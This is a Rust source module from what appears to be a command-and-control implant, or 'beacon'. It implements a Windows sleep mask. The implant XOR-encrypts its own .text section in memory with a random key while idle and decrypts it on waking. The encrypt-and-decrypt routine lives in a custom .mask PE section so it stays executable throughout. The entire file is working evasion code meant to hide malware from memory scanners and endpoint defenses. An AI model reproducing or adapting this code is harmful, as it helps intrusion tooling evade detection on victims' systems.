//! Sleep mask — XOR-encrypt the beacon's `.text` section during sleep.
//!
//! When `stage.sleep_mask = true` in the malleable profile, the agent encrypts
//! its own `.text` section with a random XOR key before each sleep and decrypts
//! it upon waking.  This removes executable code signatures from memory while
//! the beacon is idle.
//!
//! The encrypt → sleep → decrypt routine lives in a separate PE section (`.mask`)
//! so that it remains executable while `.text` is encrypted.
//!
//! Windows-only (`#[cfg(target_os = "windows")]`).  Non-Windows builds get a
//! no-op stub.

// ─── Windows implementation ──────────────────────────────────────────────────

#[cfg(target_os = "windows")]
mod win {
    use anyhow::{Context, Result};
    use std::ptr;
    use windows_sys::Win32::System::LibraryLoader::{
        GetModuleHandleW, GetProcAddress, LoadLibraryA,
    };
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_READWRITE};
    use windows_sys::Win32::System::SystemInformation::GetTickCount;
    use windows_sys::Win32::System::Threading::Sleep;

    /// XOR a memory region in-place with a cyclic key.
    ///
    /// Placed in `.mask` section so it survives `.text` encryption.
    #[unsafe(link_section = ".mask")]
    #[inline(never)]
    unsafe fn xor_region(base: *mut u8, size: usize, key: *const u8, key_len: usize) {
        let mut i = 0usize;
        while i < size {
            *base.add(i) ^= *key.add(i % key_len);
            i += 1;
        }
    }

    /// Core masked-sleep routine that lives entirely in `.mask`.
    ///
    /// Sequence:
    /// 1. `VirtualProtect(.text, PAGE_READWRITE)` — writable, non-executable
    /// 2. XOR encrypt `.text`
    /// 3. `kernel32!Sleep(duration_ms)` — outside our module, unaffected
    /// 4. XOR decrypt `.text`
    /// 5. `VirtualProtect(.text, PAGE_EXECUTE_READ)` — restore execute permission
    #[unsafe(link_section = ".mask")]
    #[inline(never)]
    unsafe fn do_masked_sleep(
        text_base: *mut u8,
        text_size: usize,
        key: *const u8,
        key_len: usize,
        duration_ms: u32,
    ) {
        let mut old_protect: u32 = 0;

        // 1. Remove execute, allow writes.
        VirtualProtect(
            text_base as *const _,
            text_size,
            PAGE_READWRITE,
            &mut old_protect,
        );

        // 2. Encrypt .text.
        xor_region(text_base, text_size, key, key_len);

        // 3. Sleep (kernel32 — not in our .text).
        Sleep(duration_ms);

        // 4. Decrypt .text (XOR is self-inverse).
        xor_region(text_base, text_size, key, key_len);

        // 5. Restore execute permission.
        VirtualProtect(
            text_base as *const _,
            text_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );
    }

    pub struct SleepMask {
        text_base: *mut u8,
        text_size: usize,
    }

    // SAFETY: The raw pointers reference our own module's PE sections which are
    // valid for the entire process lifetime.  Only one thread calls `masked_sleep`
    // at a time (the beacon loop via `spawn_blocking`).
    unsafe impl Send for SleepMask {}
    unsafe impl Sync for SleepMask {}

    impl SleepMask {
        /// Create a new `SleepMask` by parsing the current module's PE headers to
        /// locate the `.text` section.  Also ensures the `.mask` section (where the
        /// encrypt/decrypt routines live) is executable.
        pub fn new() -> Result<Self> {
            unsafe {
                let base = GetModuleHandleW(ptr::null()) as *const u8;
                if base.is_null() {
                    anyhow::bail!("GetModuleHandleW returned null");
                }

                let (text_base, text_size) = find_pe_section(base, b".text\0\0\0")
                    .context("failed to find .text section in PE headers")?;

                // Ensure .mask section is executable (custom sections may default
                // to read-only on some linkers).
                if let Some((mask_base, mask_size)) = find_pe_section(base, b".mask\0\0\0") {
                    let mut old: u32 = 0;
                    VirtualProtect(
                        mask_base as *const _,
                        mask_size,
                        PAGE_EXECUTE_READ,
                        &mut old,
                    );
                }

                Ok(Self {
                    text_base,
                    text_size,
                })
            }
        }

        /// Encrypt `.text`, sleep for `duration_ms`, then decrypt `.text`.
        ///
        /// **Blocks the calling thread** — call from `tokio::task::spawn_blocking`.
        pub fn masked_sleep(&self, duration_ms: u32) {
            let key = generate_xor_key(32);
            unsafe {
                do_masked_sleep(
                    self.text_base,
                    self.text_size,
                    key.as_ptr(),
                    key.len(),
                    duration_ms,
                );
            }
        }
    }

    // ── PE header parsing ────────────────────────────────────────────────────

    /// Walk the PE section table and return `(base_va, virtual_size)` for the
    /// section whose 8-byte name matches `name`.
    unsafe fn find_pe_section(
        module_base: *const u8,
        name: &[u8; 8],
    ) -> Option<(*mut u8, usize)> {
        // DOS header: must start with "MZ".
        let dos_magic = *(module_base as *const u16);
        if dos_magic != 0x5A4D {
            return None;
        }

        // e_lfanew → PE signature offset.
        let e_lfanew = *(module_base.add(0x3C) as *const u32) as usize;
        let pe_sig = *(module_base.add(e_lfanew) as *const u32);
        if pe_sig != 0x0000_4550 {
            return None;
        }

        // COFF header immediately follows PE signature (4 bytes).
        let coff = module_base.add(e_lfanew + 4);
        let num_sections = *(coff.add(2) as *const u16) as usize;
        let opt_header_size = *(coff.add(16) as *const u16) as usize;

        // First section header = coff + 20 (COFF size) + optional header size.
        let first_section = coff.add(20 + opt_header_size);

        for i in 0..num_sections {
            let section = first_section.add(i * 40);
            let section_name = std::slice::from_raw_parts(section, 8);
            if section_name == name {
                let virtual_size = *(section.add(8) as *const u32) as usize;
                let virtual_address = *(section.add(12) as *const u32) as usize;
                let section_base = module_base.add(virtual_address) as *mut u8;
                return Some((section_base, virtual_size));
            }
        }
        None
    }

    // ── Random key generation ────────────────────────────────────────────────

    /// Generate a cryptographically random XOR key via `RtlGenRandom`
    /// (`SystemFunction036` from advapi32.dll).  Falls back to a simple PRNG
    /// seeded from `GetTickCount` if the API is unavailable.
    fn generate_xor_key(len: usize) -> Vec<u8> {
        let mut key = vec![0u8; len];

        unsafe {
            // RtlGenRandom is exported as SystemFunction036.
            type RtlGenRandomFn = unsafe extern "system" fn(*mut u8, u32) -> i32;

            let advapi32 = LoadLibraryA(b"advapi32.dll\0".as_ptr());
            if !advapi32.is_null() {
                let proc = GetProcAddress(advapi32, b"SystemFunction036\0".as_ptr());
                if let Some(func) = proc {
                    let gen_random: RtlGenRandomFn = std::mem::transmute(func);
                    gen_random(key.as_mut_ptr(), len as u32);
                }
            }
        }

        // Fallback: xorshift64 seeded from GetTickCount.
        if key.iter().all(|&b| b == 0) {
            unsafe {
                let mut state = GetTickCount() as u64 | 1;
                for b in key.iter_mut() {
                    state ^= state << 13;
                    state ^= state >> 7;
                    state ^= state << 17;
                    *b = (state >> 8) as u8;
                }
            }
        }

        key
    }
}

// ─── Non-Windows stub ────────────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
mod stub {
    use anyhow::Result;

    /// No-op sleep mask for non-Windows platforms.
    pub struct SleepMask;

    impl SleepMask {
        pub fn new() -> Result<Self> {
            Ok(Self)
        }

        /// No-op — the caller falls through to a regular `tokio::time::sleep`.
        pub fn masked_sleep(&self, _duration_ms: u32) {
            // Sleep mask is a Windows-only feature.
        }
    }
}

// ─── Re-export ───────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub use win::SleepMask;

#[cfg(not(target_os = "windows"))]
pub use stub::SleepMask;
